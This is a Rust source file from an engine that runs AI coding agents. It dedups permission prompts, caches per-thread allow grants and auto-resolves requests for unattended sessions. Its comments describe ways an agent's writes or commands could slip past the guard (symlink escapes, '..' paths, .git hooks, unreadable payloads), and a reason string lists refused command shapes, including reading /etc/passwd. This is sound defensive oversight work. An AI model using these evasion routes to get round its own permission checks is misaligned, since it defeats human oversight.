//! Dedup state for permission prompts, shared by the two permission lanes:
//! the coding agent (Claude Code, via the MCP permission-prompt tool) and the
//! Lucidos Agent's command guard (chat bash/python, ADR 0002). The generic
//! [`PermissionState`] / [`PermissionEntry`] mechanism lives here; the CC-
//! specific superseded/recovery helpers and reason constants are below, and
//! the command-lane specifics live in `engine::command_permission`.
//!
//! Why dedup: a single agent turn can fire several requests for the same
//! logical action, and each one would render its own `PermissionCard`. So this
//! state collapses identical `(thread_id, tool_name, input)` requests onto a
//! single canonical entry. The first request emits the event, every subsequent
//! identical one subscribes to the same broadcast channel, and one click
//! answers every blocked waiter.
//!
//! In-flight waiters live entirely in memory and are dropped on engine restart,
//! so there is nothing to recover beyond the orphan-resolution sweeps.
//!
//! The per-thread session-allow set is different: it is a **cache** over
//! durable state. [`hydrate_session_allows`] refills a thread's set from the
//! event store on the first prompt after a restart.

use std::collections::{HashMap, HashSet};
use std::path::Path;
use std::sync::{Arc, Mutex, RwLock};
use uuid::Uuid;

use crate::engine::command_guard::{
    self, unwrap_shell_command, RiskLane, SideEffectCategory, StaticVerdict,
};
use crate::engine::event_bus::{BusEvent, EventBus};
use crate::engine::thread_events::{
    ActorMode, EngineReason, EventMeta, MessageOrigin, ThreadDirection, ThreadEvent,
};
use crate::llm::tool_names as tn;
use crate::triggers::TriggerConfig;

/// User-facing reason on a denied permission. Surfaces in the response body
/// returned to CC's MCP middleware and in the persisted `Resolved` event.
pub const DENIAL_REASON: &str = "User denied";

/// Reason returned to the coding agent when a prompt resolves because the
/// broadcast channel CLOSED. The engine is tearing down, and the user did not
/// click Deny. Distinct from `DENIAL_REASON`: a restart is not a user decision,
/// so a resumed session must not read it as "the user rejected my approach".
/// The companion half is `RESTART_NOT_REJECTION_RULE` in
/// `agent_session::prompts`.
pub const RESTART_INTERRUPT_REASON: &str =
    "Interrupted by an engine restart — not a user decision. Re-attempt the action; \
     the restart did not reject your approach.";

/// Reason stamped on a `CodingAgentPermissionResolved` that the engine emits
/// because the user typed a new message instead of answering the permission
/// card. Distinct from `DENIAL_REASON` (an explicit Deny click) and from the
/// orphan-recovery reason in `recover_orphan_cc_permission_requests` (the
/// Claude Code subprocess died first).
pub const SUPERSEDED_REASON: &str = "Superseded by a new message";

/// Reason stamped on a `CodingAgentPermissionResolved` that the engine emits
/// when a coding-agent session IDLES with a permission card still unresolved.
/// Cleared at the turn boundary in `emit_coding_agent_idled`, so the stale card
/// cannot sit clickable and a later click cannot resurrect the finished thread.
/// Distinct from `SUPERSEDED_REASON` and from the boot orphan-recovery reason.
pub const SESSION_ENDED_REASON: &str =
    "Coding agent session ended before answering — request expired";

/// Reason returned to CC's MCP middleware when `permission_prompt` auto-allows
/// a request through a session-allow match. Every fast path here emits NO
/// request or resolved event, so the string never reaches the chat UI. It only
/// rides the response body, so the agent's tool log records why the prompt was
/// bypassed.
pub const SESSION_ALLOW_REASON: &str = "Allowed for this thread";

/// Reason returned when the request is covered by this workspace's persisted
/// coding-agent allowlist, the file an "Always allow" click appends to. Emits
/// no events either, for the same reason [`SESSION_ALLOW_REASON`] does not.
pub const PERSISTED_ALLOW_REASON: &str = "Allowed by this workspace's coding-agent allowlist";

/// Reason returned when the request is a file write landing inside the
/// session's own worktree (see [`worktree_write_auto_allowed`]).
pub const WORKTREE_WRITE_ALLOW_REASON: &str =
    "Auto-allowed: file write inside this session's own worktree";

/// Reason on an unattended auto-ALLOW of a benign in-workspace request. The
/// coding-agent session was launched by a trigger with no human to answer a
/// card, so the engine resolves immediately.
pub const UNATTENDED_ALLOW_BENIGN_REASON: &str =
    "Auto-allowed: benign in-workspace operation (unattended trigger session)";

/// Reason on an unattended auto-ALLOW of an irreversible side-effect whose
/// category is covered by the originating trigger's side-effect grant.
pub const UNATTENDED_ALLOW_GRANTED_REASON: &str =
    "Auto-allowed: covered by the trigger's side-effect grant";

/// Reason on an unattended auto-DENY of a catastrophic command, denied
/// regardless of any grant (the command guard's hard deny-list).
pub const UNATTENDED_DENY_CATASTROPHIC_REASON: &str =
    "Auto-denied: catastrophic operation, never permitted unattended";

/// Reason on an unattended auto-DENY of a [`RequestVerdict::Unclassified`]
/// request. Names what the guard refused so the run is diagnosable from the
/// agent's own failure report, and says how to get the work done anyway.
pub const UNATTENDED_DENY_UNCLASSIFIED_REASON: &str =
    "Auto-denied: this coding-agent session runs unattended, and the command guard's static pass \
     refused to settle this request as safe. It refuses a command whose head is not what runs, \
     or not all of it: command substitution, a code-injecting VAR=value preamble, a \
     path-qualified command head (./x, bin/x), a redirect or a write outside the workspace, an \
     executable git config or git output flag, and a payload it could not read. Retry with a \
     shape the guard can read: a bare command head, no substitution, and any output kept inside \
     the workspace. To read a file outside the workspace use cat, head or grep, which stay on \
     the safe fast path.";

/// Grouping key for collapsing identical concurrent permission requests. The
/// canonical input is the serialized `input`, which suffices because the agent
/// re-serializes the same struct each time and produces the same bytes.
pub type DedupKey = (Uuid, String, String);

/// Canonical pending entry, owning the broadcast channel that fans the answer
/// out to every blocked waiter on this `(thread, tool, input)` triple.
/// `tool_name` and `input` are kept on the entry as well as in the `DedupKey`.
/// The consent handler can then derive an "Always allow" pattern without
/// re-parsing the canonical input.
pub struct PermissionEntry {
    pub thread_id: Uuid,
    pub request_id: String,
    pub tool_name: String,
    pub input: serde_json::Value,
    pub tx: tokio::sync::broadcast::Sender<bool>,
}

/// Two-way index: lookup by `DedupKey` when a new request arrives, lookup by
/// `request_id` when the user submits consent. `session_allows` remembers the
/// user's "Allow for this thread" choices so subsequent identical-pattern
/// requests skip the prompt entirely.
///
/// `session_allows` is a **cache, not the source of truth**. The grants are
/// durable in the event store, and [`hydrate_session_allows`] refills a
/// thread's set from there on the first prompt after an engine restart.
///
/// `hydrated_threads` is that cache's per-thread "already refilled" marker. It
/// is set only after a SUCCESSFUL read, so a transient DB failure retries on
/// the next prompt rather than pinning an empty set. Only the coding-agent lane
/// hydrates today. The command lane shares this struct but persists a command
/// string rather than a tool `input`, so it needs its own extractor first.
#[derive(Default)]
pub struct PermissionState {
    pub by_dedup_key: HashMap<DedupKey, PermissionEntry>,
    pub by_request_id: HashMap<String, DedupKey>,
    pub session_allows: HashMap<Uuid, HashSet<String>>,
    pub hydrated_threads: HashSet<Uuid>,
}

impl PermissionState {
    /// Resolve and remove the entry for `request_id`, returning the broadcast
    /// sender so the caller can fan the answer out to all listeners. Returns
    /// `None` if no permission entry matches (the consent endpoint then 404s).
    pub fn take(&mut self, request_id: &str) -> Option<PermissionEntry> {
        let key = self.by_request_id.remove(request_id)?;
        self.by_dedup_key.remove(&key)
    }

    /// Record a session-allow pattern for a thread. Idempotent: a duplicate
    /// insert is a no-op. The pattern is what `derive_allow_pattern` returned
    /// for `AllowScope::Session` on the originating prompt, and matching is
    /// exact-string against the same derivation on future prompts.
    pub fn allow_session(&mut self, thread_id: Uuid, pattern: String) {
        self.session_allows
            .entry(thread_id)
            .or_default()
            .insert(pattern);
    }

    /// True iff `pattern` is recorded for `thread_id`. Caller derives the
    /// pattern from the new request's input via `derive_allow_pattern`.
    pub fn matches_session_allow(&self, thread_id: Uuid, pattern: &str) -> bool {
        self.session_allows
            .get(&thread_id)
            .is_some_and(|set| set.contains(pattern))
    }

    /// Look up `dedup_key`. If a canonical entry already exists (a duplicate
    /// concurrent request), subscribe to its broadcast and reuse its
    /// `request_id`. Otherwise create a fresh entry, register both indexes, and
    /// return a fresh receiver.
    ///
    /// Returns `(request_id, receiver, is_canonical)`. The caller emits the
    /// request event only when `is_canonical` is true. A burst of identical
    /// concurrent requests then renders a single card, and one click answers
    /// them all. Shared by both permission lanes.
    pub fn register_or_attach(
        &mut self,
        dedup_key: DedupKey,
        thread_id: Uuid,
        tool_name: String,
        input: serde_json::Value,
    ) -> (String, tokio::sync::broadcast::Receiver<bool>, bool) {
        // Opportunistic sweep: each new prompt evicts orphans whose waiters
        // were canceled and would otherwise leak until an engine restart.
        self.gc_dead_entries();
        if let Some(entry) = self.by_dedup_key.get(&dedup_key) {
            return (entry.request_id.clone(), entry.tx.subscribe(), false);
        }
        let request_id = Uuid::new_v4().to_string();
        let (tx, rx) = tokio::sync::broadcast::channel(1);
        self.by_dedup_key.insert(
            dedup_key.clone(),
            PermissionEntry {
                thread_id,
                request_id: request_id.clone(),
                tool_name,
                input,
                tx,
            },
        );
        self.by_request_id.insert(request_id.clone(), dedup_key);
        (request_id, rx, true)
    }

    /// Drop entries whose subscribers have all been canceled. With no live
    /// receiver the entry can never deliver an answer, and it would otherwise
    /// sit in memory until an engine restart. Cheap O(N) sweep, bounded by the
    /// user's pending in-flight prompts.
    pub fn gc_dead_entries(&mut self) {
        let dead: Vec<DedupKey> = self
            .by_dedup_key
            .iter()
            .filter(|(_, entry)| entry.tx.receiver_count() == 0)
            .map(|(k, _)| k.clone())
            .collect();
        for key in dead {
            if let Some(entry) = self.by_dedup_key.remove(&key) {
                self.by_request_id.remove(&entry.request_id);
            }
        }
    }
}

/// Outcome of one blocking permission prompt: what the caller relays back to
/// its agent.
pub struct PermissionPromptOutcome {
    pub allowed: bool,
    pub reason: Option<String>,
}

/// How many changed paths a `file_change` summary names before collapsing into
/// a `+N more` tail. Three keeps the line readable while still naming enough of
/// a patch to recognize it.
const SUMMARY_MAX_PATHS: usize = 3;

/// What the engine could learn about a file-write request's targets.
///
/// Three states rather than a `Vec`, because both decisions below are made over
/// the WHOLE set. A plain list cannot tell "no targets, this is not a file
/// write" from "a target we could not read". Dropping an unreadable entry is
/// the dangerous shape: its siblings would vouch for it, and one in-worktree
/// path would auto-approve a patch whose other half writes somewhere unseen.
enum FileTargets {
    /// Not one of the file-write tools.
    NotAFileWrite,
    /// Every target the request names, all of them resolved. Never empty, so
    /// the `all()` below can never vacuously approve nothing.
    Known(Vec<String>),
    /// A file write at least one of whose targets could not be read.
    Unresolved,
}

/// Render the PermissionCard's one-line summary from the tool call shape.
/// Picks the first recognizable argument; falls back to the bare tool name.
///
/// A Codex `file_change` is the awkward one. Its approval request carries no
/// path of its own, so the paths come from the `changes` list the driver
/// attached. They win over `reason` and `grant_root`, which stay as last-resort
/// keys for an unknown `changes` list but both arrive `null` in practice.
pub fn build_permission_summary(tool_name: &str, input: &serde_json::Value) -> String {
    let display_name = match tool_name {
        "Skill" => "skill",
        _ => tool_name,
    };
    // Only a FULLY resolved `changes` list is named, and only from `changes`
    // itself. Listing the entries that parsed would be worse than naming none:
    // the user would read a complete-looking card and approve a patch whose
    // unnamed half writes elsewhere. A `grant_root` is a directory the agent
    // wants opened up, not a file it is editing. It stays a last-resort key
    // below rather than posing as one.
    if tool_name == "file_change" && input.get("changes").is_some() {
        if let FileTargets::Known(paths) = coding_agent_file_targets(tool_name, input) {
            let shown = paths
                .iter()
                .take(SUMMARY_MAX_PATHS)
                .map(String::as_str)
                .collect::<Vec<_>>()
                .join(", ");
            let rest = paths.len().saturating_sub(SUMMARY_MAX_PATHS);
            return if rest > 0 {
                format!("{} {} +{} more", display_name, shown, rest)
            } else {
                format!("{} {}", display_name, shown)
            };
        }
    }
    let arg = [
        "file_path",
        "path",
        "command",
        "notebook_path",
        "skill",
        "url",
        "pattern",
        "reason",
        "grant_root",
    ]
    .iter()
    .find_map(|k| input.get(k).and_then(|v| v.as_str()))
    .unwrap_or("");
    if arg.is_empty() {
        display_name.to_string()
    } else {
        format!("{} {}", display_name, arg)
    }
}

/// Recover the originating user actor for a coding-agent thread from its most
/// recent user-message event. Narrowing to those two event types keeps a later
/// engine-stamped event from overwriting the human actor. Returns `None` when
/// no such event carries an actor, and the caller falls back to
/// `EventMeta::NONE`.
pub async fn lookup_thread_actor(pool: &sqlx::PgPool, thread_id: Uuid) -> Option<MessageOrigin> {
    let row: Result<Option<(serde_json::Value,)>, sqlx::Error> = sqlx::query_as(
        "SELECT payload->'actor' FROM events \
         WHERE thread_id = $1 \
           AND event_type IN ('MessageReceived', 'CodingAgentUserMessageSent') \
           AND payload ? 'actor' \
           AND payload->'actor' != 'null'::jsonb \
         ORDER BY sequence DESC LIMIT 1",
    )
    .bind(thread_id)
    .fetch_optional(pool)
    .await;
    match row {
        Ok(Some((v,))) => serde_json::from_value::<MessageOrigin>(v).ok(),
        Ok(None) => None,
        Err(e) => {
            crate::log!(
                "[CCPermission] lookup_thread_actor failed for thread {}: {}",
                thread_id,
                e
            );
            None
        }
    }
}

/// Refill `thread_id`'s in-memory session-allow set from the event store, once
/// per thread per engine lifetime. The grants are durable, but
/// `PermissionState::session_allows` is only a cache, and a thread that
/// survives a restart must keep the grant the user gave it.
///
/// Deliberately **lazy** rather than a boot sweep: the work lands on the one
/// path that was about to block on a human anyway. Only genuine session grants
/// hydrate, because the `allowed` and `persist_scope` filter excludes
/// Allow-once, Deny, the scopes that live in `cc-allowed-tools`, and every
/// engine-emitted resolution. The pattern is re-derived by the same call that
/// recorded the grant, so the two cannot drift.
///
/// `r.thread_id = $1` is a **trust boundary, not just a scope filter**. This
/// query turns persisted rows into standing grants, so it must read only rows
/// the engine wrote through `BusEvent::Thread`. A domain event is persisted
/// with a NULL `thread_id`, so a row forged through the emit endpoint can never
/// satisfy it. The boundary holds on BOTH aliases, which is why `q` carries its
/// own `thread_id = $1`: the REQUEST row supplies `tool_name` and `input`.
/// Fails toward asking: a query error leaves the thread unhydrated.
async fn hydrate_session_allows(
    pool: &sqlx::PgPool,
    pending: &Mutex<PermissionState>,
    thread_id: Uuid,
) {
    use crate::engine::claude_code::{derive_allow_pattern, AllowScope};

    {
        let state = pending.lock().unwrap();
        if state.hydrated_threads.contains(&thread_id) {
            return;
        }
    } // Lock released before the await — never hold it across one.

    let rows: Vec<(Option<String>, Option<serde_json::Value>)> = match sqlx::query_as(
        "SELECT q.payload->>'tool_name', q.payload->'input' \
         FROM events r \
         JOIN events q \
           ON q.event_type = 'CodingAgentPermissionRequest' \
          AND q.thread_id = $1 \
          AND q.payload->>'request_id' = r.payload->>'request_id' \
         WHERE r.event_type = 'CodingAgentPermissionResolved' \
           AND r.thread_id = $1 \
           AND (r.payload->>'allowed')::boolean IS TRUE \
           AND r.payload->>'persist_scope' = 'session'",
    )
    .bind(thread_id)
    .fetch_all(pool)
    .await
    {
        Ok(rows) => rows,
        Err(e) => {
            crate::log!(
                "[CCPermission] session-allow hydration failed for thread {}: {} \
                 — the card will render and the next prompt retries",
                thread_id,
                e
            );
            return;
        }
    };

    let patterns: Vec<String> = rows
        .into_iter()
        .filter_map(|(tool_name, input)| {
            derive_allow_pattern(&tool_name?, &input?, AllowScope::Session)
        })
        .collect();

    let mut state = pending.lock().unwrap();
    let count = patterns.len();
    for pattern in patterns {
        state.allow_session(thread_id, pattern);
    }
    // Marked only on the success path, so a failed read above retries.
    state.hydrated_threads.insert(thread_id);
    if count > 0 {
        crate::log!(
            "[CCPermission] rehydrated {} session-allow pattern(s) for thread {}",
            count,
            thread_id
        );
    }
}

/// Whether a coding-agent session has a human reachable to answer a permission
/// card. [`resolve_attend_mode`] decides it by walking the spawn tree to its
/// root. A human device there renders a card and waits. Any engine origin there
/// auto-resolves and never hangs.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum AttendMode {
    /// A human is reachable at the root of the spawn tree — render a card and
    /// wait indefinitely (the pre-existing behavior).
    Interactive,
    /// No human is reachable. Auto-resolve permission requests immediately.
    /// `grant` is the originating trigger's side-effect grant (empty when the
    /// root is the engine but not a scheduler-fired trigger).
    Unattended { grant: Vec<SideEffectCategory> },
}

/// Hard cap on the spawn-tree walk so a malformed parent chain (or a cycle) can
/// never loop forever. Real spawn trees are shallow; a chain this deep is
/// almost certainly automated, so the cap-exceeded fallback is `Unattended`.
const MAX_ANCESTRY_HOPS: usize = 16;

/// Read a thread's *originating* `MessageOrigin` — the earliest event that
/// carries one, among the spawn-defining event types. `TriggerStarted` (a direct
/// scheduler-fired thread) and `MessageReceived` (chat or an agent-spawned
/// sub-thread) both stamp a `MessageOrigin` into `payload->'origin'`. Returns
/// `None` when no such event carries an origin (legacy rows / odd threads),
/// which the caller treats as interactive (preserve the pre-existing behavior).
///
/// Also returns that row's `parent_thread_id`, the *callback linkage*, which is
/// a strictly narrower thing than the origin: a `relation: "top"` spawn and a
/// parent's child follow-up both stamp a `ThreadLink` origin with NO linkage.
/// `resolve_attend_mode` walks up only where the linkage exists, so attribution
/// alone never carries a trigger's grant across a boundary the user asked to be
/// independent.
async fn fetch_thread_origin_and_linkage(
    pool: &sqlx::PgPool,
    thread_id: Uuid,
) -> Option<(MessageOrigin, Option<Uuid>)> {
    let row: Result<Option<(serde_json::Value, Option<Uuid>)>, sqlx::Error> = sqlx::query_as(
        "SELECT payload->'origin', (payload->>'parent_thread_id')::uuid FROM events \
         WHERE thread_id = $1 \
           AND event_type IN ('TriggerStarted', 'MessageReceived') \
           AND payload ? 'origin' \
           AND payload->'origin' != 'null'::jsonb \
         ORDER BY sequence ASC LIMIT 1",
    )
    .bind(thread_id)
    .fetch_optional(pool)
    .await;
    match row {
        Ok(Some((v, parent_thread_id))) => serde_json::from_value::<MessageOrigin>(v)
            .ok()
            .map(|origin| (origin, parent_thread_id)),
        Ok(None) => None,
        Err(e) => {
            crate::log!(
                "[CCPermission] fetch_thread_origin_and_linkage failed for {}: {}",
                thread_id,
                e
            );
            None
        }
    }
}

/// Decide whether this coding-agent session is interactive or unattended, and
/// what side-effect grant an unattended one inherits. Walks the spawn tree from
/// `thread_id` up to its root through the persisted `MessageOrigin` chain:
///
///   * a `Device`, or a human-mode `Api` or `Workspace`, gives `Interactive`.
///   * a scheduler origin gives `Unattended` with that trigger's
///     `side_effect_grant`, read from the in-memory registry that boot rebuilds
///     from events.
///   * any other non-human origin gives `Unattended` with an empty grant.
///   * a `ThreadLink { direction: Parent }` **whose event also carries the
///     `parent_thread_id` callback linkage** hops to the parent and continues.
///     A `ThreadLink` without linkage is attribution only. It names who
///     launched the thread for the route popover, and deliberately does NOT
///     lend that thread's attend mode or grant. Anything unclassifiable gives
///     `Interactive`, so an independent spawn asks a human.
///
/// Everything derives from already-persisted events plus the trigger registry,
/// with no new persistence and no spawn-time plumbing. A user-rooted tree stays
/// interactive even when an agent spawned the leaf thread.
pub async fn resolve_attend_mode(
    pool: &sqlx::PgPool,
    trigger_configs: &Arc<RwLock<HashMap<String, TriggerConfig>>>,
    thread_id: Uuid,
) -> AttendMode {
    let mut current = thread_id;
    let mut seen: HashSet<Uuid> = HashSet::new();
    for _ in 0..MAX_ANCESTRY_HOPS {
        if !seen.insert(current) {
            break; // cycle guard, which a real tree never trips
        }
        let Some((origin, callback_linkage)) = fetch_thread_origin_and_linkage(pool, current).await
        else {
            // No recorded origin, so stay interactive rather than
            // auto-resolving a thread we cannot classify.
            return AttendMode::Interactive;
        };
        match origin {
            MessageOrigin::Device { .. } => return AttendMode::Interactive,
            MessageOrigin::Api {
                mode,
                source_thread_id,
                ..
            } => match (mode, source_thread_id) {
                (ActorMode::Human, _) => return AttendMode::Interactive,
                (_, Some(parent)) => {
                    current = parent;
                }
                (_, None) => return AttendMode::Unattended { grant: Vec::new() },
            },
            MessageOrigin::Workspace { mode, .. } => {
                return match mode {
                    ActorMode::Human => AttendMode::Interactive,
                    _ => AttendMode::Unattended { grant: Vec::new() },
                };
            }
            MessageOrigin::ThreadLink { direction, .. } => {
                // Only a Parent link means "the linked thread spawned me". A
                // Child callback should never be a thread's originating origin,
                // so treat it as non-human.
                if direction != ThreadDirection::Parent {
                    return AttendMode::Unattended { grant: Vec::new() };
                }
                // Hop via the LINKAGE, not the origin's `thread_id`. The two
                // name the same thread on every row the engine writes. But this
                // walk decides privilege, and `parent_thread_id` owns
                // parent-ness while the origin owns display. Absent linkage is a
                // top-level spawn, which names its spawning thread for the
                // popover but is NOT in that thread's tree. The walk stops there
                // rather than inheriting a trigger's grant.
                match callback_linkage {
                    Some(parent) => current = parent,
                    None => return AttendMode::Interactive,
                }
            }
            MessageOrigin::Engine { reason } => {
                return match reason {
                    EngineReason::Scheduler { trigger_id, .. } => {
                        let grant = trigger_configs
                            .read()
                            .ok()
                            .and_then(|m| m.get(&trigger_id).map(|c| c.side_effect_grant.clone()))
                            .unwrap_or_default();
                        AttendMode::Unattended { grant }
                    }
                    _ => AttendMode::Unattended { grant: Vec::new() },
                };
            }
            // An agent authored it, so nobody is attending. Not expected as an
            // ORIGINATING origin: the variant is stamped on what an agent
            // wrote, and a thread starts from what a caller sent. Classified
            // anyway rather than left unclassifiable, because "an LLM decided"
            // is the unattended case exactly, and it lends no grant.
            MessageOrigin::Agent { .. } => return AttendMode::Unattended { grant: Vec::new() },
            // A webhook is an external caller, so it lends no grant at all. A
            // trigger that fires on the event it emitted carries its OWN grant,
            // and arrives here as `Engine { Scheduler }` rather than this.
            MessageOrigin::Webhook { .. } | MessageOrigin::System => {
                return AttendMode::Unattended { grant: Vec::new() }
            }
        }
    }
    // Depth or cycle exceeded. A chain this deep is automated, so never hang.
    AttendMode::Unattended { grant: Vec::new() }
}

/// Static classification of one coding-agent permission request, deciding how
/// an unattended session resolves it. Deterministic: it reuses the command
/// guard's static passes and never the LLM judge, because the permission path
/// must not be able to stall.
#[derive(Debug, Clone, PartialEq, Eq)]
pub enum RequestVerdict {
    /// Benign in-workspace work — allow even with an empty grant.
    Benign,
    /// A catastrophic, irreversible operation — deny regardless of any grant.
    Catastrophic,
    /// An irreversible real-world side-effect of this category — allow only when
    /// the trigger's grant contains it.
    SideEffect(SideEffectCategory),
    /// The static pass REFUSED to settle this request rather than merely not
    /// recognising it. `command_guard::FastPathDecline::Refusal` owns the full
    /// list; a payload that could not be read joins it here.
    ///
    /// Denied unattended, whatever the grant. Nobody is watching, which is the
    /// strongest reason to refuse a shape the guard cannot see through, not a
    /// reason to run it. A merely UNRECOGNISED head (`cargo build`) is still
    /// [`RequestVerdict::Benign`], because a missing allowlist entry costs
    /// latency rather than safety.
    ///
    /// The refusal set reaches further than an attack shape, and that cost is
    /// accepted rather than overlooked: a `/tmp` log redirect, a
    /// `./scripts/x.sh` head, and `sort /etc/passwd` are all refusals, so an
    /// unattended session is denied them and retries per
    /// [`UNATTENDED_DENY_UNCLASSIFIED_REASON`]. A deny costs one request, not
    /// the run (ADR 0002).
    Unclassified,
}

/// What a coding-agent *command* request carries. Codex raises these as
/// `command_execution`; Claude Code as `Bash`.
///
/// The three cases are not two. "Not a command request" and "a command request
/// whose payload I could not read" used to collapse into one `None`. The
/// caller then fell through to its benign default, and an unattended session
/// auto-allowed a command it had never seen the text of.
enum CommandPayload<'a> {
    /// Not a command request at all.
    NotACommand,
    /// The command text.
    Known(&'a str),
    /// A command request whose `command` field is missing, not a string, or
    /// empty. Nothing can be classified, so it is denied unattended.
    Unresolved,
}

/// Read the shell command out of a coding-agent *command* request.
fn coding_agent_command<'a>(tool_name: &str, input: &'a serde_json::Value) -> CommandPayload<'a> {
    if !matches!(tool_name, "command_execution" | "Bash") {
        return CommandPayload::NotACommand;
    }
    match input.get("command").and_then(|v| v.as_str()) {
        Some(cmd) if !cmd.trim().is_empty() => CommandPayload::Known(cmd),
        _ => CommandPayload::Unresolved,
    }
}

/// Extract the target paths of a coding-agent *file-write* request. Claude Code
/// raises one of several tools, each naming a single path. Codex raises
/// `file_change`, whose `changes` list can name several files at once.
///
/// **One unreadable entry makes the whole set [`FileTargets::Unresolved`]**,
/// rather than being filtered out. A partially-understood patch really does
/// reach here, and excusing it by the entries that DID parse is exactly the
/// fail-open the callers must not make.
fn coding_agent_file_targets(tool_name: &str, input: &serde_json::Value) -> FileTargets {
    if !matches!(
        tool_name,
        "file_change" | "Edit" | "Write" | "MultiEdit" | "NotebookEdit"
    ) {
        return FileTargets::NotAFileWrite;
    }
    // `changes` is Codex vocabulary, so only a `file_change` may be read from
    // it. Without the tool gate, a stray `changes` key on a Claude Code `Write`
    // would REPLACE its real `file_path`. One in-worktree entry would then skip
    // the card for a write landing anywhere. CC's input is model-authored JSON
    // the permission server forwards verbatim, so that shape is not
    // hypothetical.
    if tool_name == "file_change" {
        if let Some(changes) = input.get("changes") {
            // Present but not a list is a shape we do not understand. That is
            // `Unresolved`, not a licence to fall through to `grant_root`.
            let Some(changes) = changes.as_array() else {
                return FileTargets::Unresolved;
            };
            let mut paths = Vec::with_capacity(changes.len());
            for change in changes {
                match change.get("path").and_then(|p| p.as_str()) {
                    // Absolute only. A relative path cannot be placed without
                    // the agent's cwd, and `path_outside_workspace` reads an
                    // unplaceable path as in-workspace, which is right for CC.
                    // For a `file_change` the request's own existence inverts
                    // that: codex raises it BECAUSE the patch escaped its
                    // sandbox, so "assume it lands in the worktree" is the one
                    // conclusion the evidence rules out.
                    Some(path) if !path.is_empty() && Path::new(path).is_absolute() => {
                        paths.push(path.to_string())
                    }
                    _ => return FileTargets::Unresolved,
                }
            }
            return if paths.is_empty() {
                // An announced patch that changes nothing is not something
                // codex raises an approval for, so read it as not understood.
                FileTargets::Unresolved
            } else {
                FileTargets::Known(paths)
            };
        }
    }
    for key in ["file_path", "path", "notebook_path", "grant_root"] {
        if let Some(s) = input.get(key).and_then(|v| v.as_str()) {
            if !s.is_empty() {
                return FileTargets::Known(vec![s.to_string()]);
            }
        }
    }
    FileTargets::Unresolved
}

/// True when `path` provably targets somewhere OUTSIDE the workspace root. A
/// `..` component cannot be proven contained lexically, so it reads as outside
/// and is grant-gated. A relative path with no `..` resolves against the
/// worktree, so it reads as inside. Otherwise check containment against the
/// workspace root, lexically first and then against the RESOLVED filesystem.
fn path_outside_workspace(path: &str, workspace_path: &Path) -> bool {
    let p = Path::new(path);
    // Checked FIRST, before the relative-is-inside shortcut: a relative
    // `../../etc/...` escapes the worktree just as an absolute one does.
    if p.components()
        .any(|c| matches!(c, std::path::Component::ParentDir))
    {
        return true;
    }
    if !p.is_absolute() {
        return false;
    }
    if !p.starts_with(workspace_path) {
        return true;
    }
    // A lexical prefix check is escapable, which is why the sibling
    // `path_inside_worktree` resolves both sides. A symlink inside the
    // workspace pointing outside makes the path read as contained while the
    // write lands elsewhere, and the unattended lane auto-allows that. Resolve
    // here too, but only to OVERRIDE a lexical "inside". When either side fails
    // to resolve we keep the lexical answer. The ordinary case is a `Write`
    // naming a file that does not exist yet, and calling that outside would
    // card every new file.
    match (
        std::fs::canonicalize(workspace_path),
        canonical_existing_prefix(p),
    ) {
        (Ok(root), Some(resolved)) => !resolved.starts_with(&root),
        _ => false,
    }
}

/// A path component that disqualifies a target from the in-worktree fast path:
/// `..`, which cannot be proven contained lexically, or `.git` (see
/// [`path_inside_worktree`]).
fn has_rejected_component(p: &Path) -> bool {
    p.components().any(|c| match c {
        std::path::Component::ParentDir => true,
        std::path::Component::Normal(name) => name == ".git",
        _ => false,
    })
}

/// Canonicalize the longest existing prefix of `p`. A `Write` names a file that
/// does not exist yet, so canonicalizing the target itself fails on exactly the
/// case we most need to classify. Walk up to the nearest ancestor that does
/// resolve, and return `None` when nothing along the chain does.
fn canonical_existing_prefix(p: &Path) -> Option<std::path::PathBuf> {
    let mut current = Some(p);
    while let Some(candidate) = current {
        if let Ok(real) = std::fs::canonicalize(candidate) {
            return Some(real);
        }
        current = candidate.parent();
    }
    None
}

/// True when `path` provably resolves INSIDE `worktree_root`, the session's own
/// disposable worktree, and is therefore covered by the reviewed-before-Apply
/// guarantee that makes [`worktree_write_auto_allowed`] safe.
///
/// "Provably" is load-bearing: a false positive here skips a security card, so
/// every branch that cannot *prove* containment returns false.
///
///   * **Symlinks are resolved, not trusted lexically.** A symlink inside the
///     worktree pointing outside makes a path look contained while the write
///     lands elsewhere, invisible to the reviewed diff. So both sides are
///     canonicalized, and an unresolvable side leaves containment unproven.
///   * **A `..` component** is checked lexically before resolution.
///   * **A `.git` component** is checked BOTH on the input path and on the
///     resolved one, so a symlink into git metadata is caught too. A hook
///     written there never appears in the diff reviewed before Apply.
///   * **A relative path** cannot be resolved without the agent's cwd, which is
///     the worktree for a repo-rooted spawn but a subdirectory for an app
///     thread. It costs nothing, since both backends pass an absolute path.
fn path_inside_worktree(path: &str, worktree_root: &Path) -> bool {
    let p = Path::new(path);
    if !p.is_absolute() || has_rejected_component(p) {
        return false;
    }
    let Ok(root) = std::fs::canonicalize(worktree_root) else {
        return false;
    };
    let Some(resolved) = canonical_existing_prefix(p) else {
        return false;
    };
    let Ok(relative) = resolved.strip_prefix(&root) else {
        return false;
    };
    !has_rejected_component(relative)
}

/// True when this coding-agent permission request is a file write landing
/// inside the session's own worktree, and can therefore be auto-allowed without
/// rendering a card.
///
/// Why this exists: Claude Code auto-approves in-cwd writes under
/// `acceptEdits` **except** under `.claude/` and `.git/`, which it routes
/// through the permission prompt in every mode. Lucidos keeps its own agent
/// configuration in `.claude/`, so editing a rule cost a card every time, and
/// no persisted scope suppresses that. The engine's policy is the simpler
/// invariant, *an in-worktree file write needs no card*.
///
/// It is safe because the worktree is disposable and every change in it is
/// reviewed in the Diff before Apply. `.git` is carved out of
/// [`path_inside_worktree`] because it is the one in-worktree location that
/// ISN'T in that diff.
///
/// Scope is the file-write vocabulary of [`coding_agent_file_targets`]. A
/// command is NOT covered, since it can do anything. A `None` `worktree_root`
/// fails closed. **Every** target must be contained, and an empty target list
/// is never auto-allowed.
pub fn worktree_write_auto_allowed(
    tool_name: &str,
    input: &serde_json::Value,
    worktree_root: Option<&Path>,
) -> bool {
    let Some(root) = worktree_root else {
        return false;
    };
    match coding_agent_file_targets(tool_name, input) {
        // `Known` is never empty by construction; the guard keeps a future edit
        // that relaxes that from turning `all()` on nothing into an auto-allow.
        FileTargets::Known(targets) => {
            !targets.is_empty()
                && targets
                    .iter()
                    .all(|target| path_inside_worktree(target, root))
        }
        FileTargets::NotAFileWrite | FileTargets::Unresolved => false,
    }
}

/// Classify one coding-agent permission request for the unattended decision.
///
